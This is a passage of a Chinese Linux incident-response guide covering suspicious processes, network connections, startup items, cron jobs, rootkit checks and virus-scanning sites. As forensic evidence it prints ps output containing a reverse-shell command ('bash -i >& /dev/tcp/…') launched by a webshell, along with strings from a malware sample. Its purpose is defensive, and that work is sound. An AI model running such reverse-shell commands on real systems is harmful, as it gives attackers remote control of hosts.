+</div><h1 id="0x03-"><a href="#0x03-" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>0x03 进程</h1>
+<p>检查是否存在可疑进程，需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，进程可能会隐藏。</p>
+<p>1）系统负载</p>
+<p>例如挖矿程序特征就是系统负载高。使用Top命令查看</p>
+<p>按照CPU排序：Shift+P</p>
+<p>按照MEM排序：Shift+M</p>
+<p>2）启动时间</p>
+<p>与前面找到的Webshell时间点比对。</p>
+<p>3）启动权限</p>
+<p>木马进程以mysql权限执行的，可以判断是通过Mysql入侵，重点排查Mysql弱口令、UDF提权等。</p>
+<p>4）父进程</p>
+<ol>
+<li>菜刀中反弹Bash</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>root@server<span class="o">]</span><span class="c1">#ps -ef | grep &#39;/dev/tcp&#39; | grep -v grep</span>
+
+apache   <span class="m">26641</span>  <span class="m">1014</span>  <span class="m">0</span> 14:59 ?        00:00:00 sh -c /bin/sh -c <span class="s2">&#34;cd /root/apache-tomcat-6.0.32/webapps/ROOT/;bash -i &gt;&amp; /dev/tcp/192.168.192.144/2345 0&gt;&amp;1;echo [S];pwd;echo [E]&#34;</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+
+<span class="o">[</span>root@server<span class="o">]</span><span class="c1">#ps -ef | grep 1014</span>
+apache    <span class="m">1014</span>  <span class="m">1011</span>  <span class="m">0</span> Sep19 ?        00:00:00 /usr/sbin/httpd
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看到父进程为apache，就可以判断攻击者通过Web入侵。</p>
+<ol start="2">
+<li>lsof -p pid：查看可疑进程打开的文件</li>
+</ol>
+<p>例如十字病毒，会修改ps和netstat显示的进程名称</p>
+<pre><code>udp        0      0 0.0.0.0:49937               0.0.0.0:*                               131683/ls -la
+
+udp        0      0 0.0.0.0:47584               0.0.0.0:*                               116515/ifconfig
+</code></pre><p>很明显的异常，ls和ifconfig不会存在监听行为。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>root@DataNode105 admin<span class="o">]</span><span class="c1"># lsof -p 131683</span>
+
+COMMAND      PID USER   FD   TYPE    DEVICE SIZE/OFF     NODE NAME
+
+hahidjqzx <span class="m">131683</span> root  cwd    DIR      8,98     <span class="m">4096</span> <span class="m">18087937</span> /root
+
+hahidjqzx <span class="m">131683</span> root  rtd    DIR      8,98     <span class="m">4096</span>        <span class="m">2</span> /
+
+hahidjqzx <span class="m">131683</span> root  txt    REG      8,98   <span class="m">625622</span> <span class="m">24123895</span> /usr/bin/hahidjqzxs
+</code></pre></td></tr></table>
+</div>
+</div><p>可疑看到真正的可执行文件是/usr/bin/hahidjqzxs</p>
+<ol start="3">
+<li>file：查看文件类型：</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>root@server<span class="o">]</span><span class="c1"># file .zl</span>
+
+zl: ELF 32-bit LSB executable, Intel 80386, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux 2.6.9, not stripped
+</code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li>strings：显示二进制的文件中可读字符</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>root@server<span class="o">]</span><span class="c1"># strings .zl</span>
+
+rm -f /boot/IptabLes <span class="p">;</span> rm -f /boot/.IptabLes <span class="p">;</span> rm -f /boot/IptabLex <span class="p">;</span> rm -f /boot/.IptabLex <span class="p">;</span> rm -f /usr
+
+/IptabLes <span class="p">;</span> rm -f /usr/.IptabLes <span class="p">;</span> rm -f /usr/IptabLex <span class="p">;</span> rm -f /usr/.IptabLex
+
+netstat -anp <span class="p">|</span> grep <span class="s2">&#34;IptabLes&#34;</span> <span class="p">|</span>awk <span class="s1">&#39;{print $NF}&#39;</span> <span class="p">|</span>cut -d <span class="s2">&#34;/&#34;</span> -f <span class="m">1</span> <span class="p">|</span> xargs <span class="nb">kill</span> -9 &gt; /dev/null <span class="p">;</span>free -m
+
+&gt; /dev/null
+
+netstat -anp <span class="p">|</span> grep <span class="s2">&#34;IptabLex&#34;</span> <span class="p">|</span>awk <span class="s1">&#39;{print $NF}&#39;</span> <span class="p">|</span>cut -d <span class="s2">&#34;/&#34;</span> -f <span class="m">1</span> <span class="p">|</span> xargs <span class="nb">kill</span> -9 &gt; /dev/null <span class="p">;</span>free -m
+
+&gt; /dev/null
+</code></pre></td></tr></table>
+</div>
+</div><p>例如之前应急遇到的命令替换，通过Strings查看发现有大量的IP地址，就是明显的异常现象。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>root@server<span class="o">]</span><span class="c1"># strings /usr/bin/.sshd | egrep &#39;[1-9]{1,3}\.[1-9]{1,3}\.&#39;</span>
+8.8.8.8
+8.8.4.4
+8.8.8.8
+61.132.163.68
+202.102.192.68
+202.102.213.68
+58.242.2.2
+202.38.64.1
+211.91.88.129
+211.138.180.2
+218.104.78.2
+202.102.199.68
+202.175.3.3
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="0x04-"><a href="#0x04-" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>0x04 网络连接</h1>
+<p>1）短连接</p>
+<p>短连接（short connnection）是相对于长连接而言的概念，指的是在数据传送过程中，只在需要发送数据时，才去建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。 在系统维护中，一般很难去察觉，需要借助网络安全设备或者抓包分析，才能够去发现。</p>
+<p>例：编写脚本捕捉pid和源文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="cp">#!/bin/bash
+</span><span class="cp"></span><span class="nv">ip</span><span class="o">=</span>118.184.15.40
+<span class="nv">i</span><span class="o">=</span><span class="m">1</span>
+<span class="k">while</span> :
+<span class="k">do</span>
+   <span class="nv">tmp</span><span class="o">=</span><span class="sb">`</span>netstat -anplt<span class="p">|</span>grep <span class="nv">$ip</span><span class="p">|</span>awk -F <span class="s1">&#39;[/]&#39;</span> <span class="s1">&#39;{print $1}&#39;</span><span class="p">|</span>awk <span class="s1">&#39;{print $7}&#39;</span><span class="sb">`</span>
+   <span class="c1">#echo $tmp</span>
+   <span class="k">if</span> <span class="nb">test</span> -z <span class="s2">&#34;</span><span class="nv">$tmp</span><span class="s2">&#34;</span>
+   <span class="k">then</span>
+       <span class="o">(</span><span class="o">(</span><span class="nv">i</span><span class="o">=</span>i+1<span class="o">)</span><span class="o">)</span> 
+   <span class="k">else</span>
+       <span class="k">for</span> pid in <span class="nv">$tmp</span><span class="p">;</span> <span class="k">do</span>
+           <span class="nb">echo</span> <span class="s2">&#34;PID: &#34;</span><span class="si">${</span><span class="nv">pid</span><span class="si">}</span>
+          <span class="nv">result</span><span class="o">=</span><span class="sb">`</span>ls -lh /proc/<span class="nv">$pid</span><span class="p">|</span>grep exe<span class="sb">`</span>
+          <span class="nb">echo</span> <span class="s2">&#34;Process: &#34;</span><span class="si">${</span><span class="nv">result</span><span class="si">}</span>
+          <span class="nb">kill</span> -9 <span class="nv">$pid</span>
+       <span class="k">done</span>
+       <span class="nb">break</span>
+   <span class="k">fi</span> 
+<span class="k">done</span>
+<span class="nb">echo</span> <span class="s2">&#34;Total number of times: &#34;</span><span class="si">${</span><span class="nv">i</span><span class="si">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>2）</p>
+<p>需要注意如果攻击者获取到了Root权限，被植入内核或者系统层Rootkit的话，连接可能会被隐藏。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">netstat -antlp <span class="p">|</span> grep ESTABLISHED
+</code></pre></td></tr></table>
+</div>
+</div><p>查看已经建立的网络连接，例如反弹bash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">netstat -antlp <span class="p">|</span> grep EST <span class="p">|</span> grep bash
+</code></pre></td></tr></table>
+</div>
+</div><p>检查可以监听端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">netstat -antlp <span class="p">|</span> grep LISTEN
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="0x05-"><a href="#0x05-" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>0x05 敏感目录</h1>
+<p>/tmp, /var/tmp, /dev/shm，所有用户都可读，可写，可执行</p>
+<h1 id="0x06-history"><a href="#0x06-history" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>0x06 history</h1>
+<p>默认的history仅记录执行的命令，然而这些对于应急来说是不够的，很多系统加固脚本会添加记录命令执行的时间，修改记录的最大条数。</p>
+<h1 id="0x07-"><a href="#0x07-" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>0x07 开机启动</h1>
+<p>1）CentOS 5系统</p>
+<ol>
+<li>/etc/inittab
+该文件是可以运行process</li>
+<li>/etc/rc.d/rc.sysinit</li>
+<li>/etc/rc.d/init.d</li>
+<li>/etc/rc.d/rc.local</li>
+</ol>
+<p>2） CentOS 6</p>
+<ol>
+<li>/etc/init/*.conf</li>
+<li>/etc/rc.d/rc.sysinit</li>
+<li>/etc/rc.d/init.d</li>
+<li>/etc/rc.d/rc.local</li>
+</ol>
+<p>3） CentOS 6</p>
+<ol>
+<li>
+<p>排查修改的service</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">find /usr/lib/systemd/system/ -name <span class="s2">&#34;*.service&#34;</span> <span class="p">|</span> xargs ls -alt <span class="p">|</span> head -n <span class="m">5</span>
+find /etc/systemd/system/ -name <span class="s2">&#34;*.service&#34;</span> <span class="p">|</span> xargs ls -alt <span class="p">|</span> head -n <span class="m">5</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>/etc/rc.d/init.d</p>
+</li>
+<li>
+<p>/etc/rc.d/rc.local
+不过需要看/etc/rc.d/rc.local是否有x权限。</p>
+</li>
+</ol>
+<h1 id="0x08-"><a href="#0x08-" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>0x08 定时任务</h1>
+<p>一般常用的定时任务crontab -l是用户级别的，保存在/var/spool/cron/{user}，每个用户都可以通过crontab -e编辑自己的定时任务列表。
+而/etc/crontab是系统级别的定时任务，只有Root账户可以修改。
+另外在应急的时候需要留意的点还有/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly,/etc/cron.monthly等周期性执行脚本的目录。</p>
+<h1 id="0x09--rootkit"><a href="#0x09--rootkit" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>0x09  Rootkit</h1>
+<p>Rootkit功能通常有隐藏文件、进程、连接、模块，网络嗅探，后门，日志擦除，键盘记录（SSH密码记录）等。</p>
+<p>检查命令替换，比较直观的方式就是比较命令的大小和mtime了。</p>
+<p>1）比对命令的大小</p>
+<p>2）查看命令的修改时间，按修改时间排序</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">ls -alt /bin/ <span class="p">|</span> head -n <span class="m">5</span> 
+</code></pre></td></tr></table>
+</div>
+</div><p>而比较全面的检测方式有：</p>
+<p>3）rpm -aV</p>
+<p>RPM Database 不仅提供了 RPM 包的查询功能，还提供了对已安装的 RPM 包进行验证的功能。默认情况下，RPM Database 存放在 /var/lib/rpm 目录。</p>
+<p>需要注意这条命令局限性就是只能检查通过RPM包安装的所有文件。另外为了防止rpm也被替换，上传一个安全干净稳定版本rpm二进制到服务器上进行检查。</p>
+<p>我们可以对系统中所有 RPM 文件做一个全面检查</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">rpm -aV
+<span class="c1">#查看bash</span>
+rpm -Vf /bin/bash
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-shell" data-lang="shell">S: 表示文件长度发生了变化
+M: 表示文件的访问权限或文件类型发生了变化
+5: 表示MD5校验和发生了变化。
+D: 表示设备节点的属性发生了变化
+L: 表示文件的符号链接发生率变化
+U: 表示文件/子目录/设备节点的owner发生了变化
+G: 表示文件/子目录/设备节点的group发生了变化
+T: 表示文件最后一次的修改时间发生了变化
+</code></pre></td></tr></table>
+</div>
+</div><p>4）使用chkrootkit和rkhunter查看</p>
+<h1 id="0x10-"><a href="#0x10-" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>0x10 病毒检测</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">https://x.threatbook.cn/
+http://www.virscan.org
+https://www.virustotal.com/
+https://fireeye.ijinshan.com/
+</code></pre></td></tr></table>
+</div>
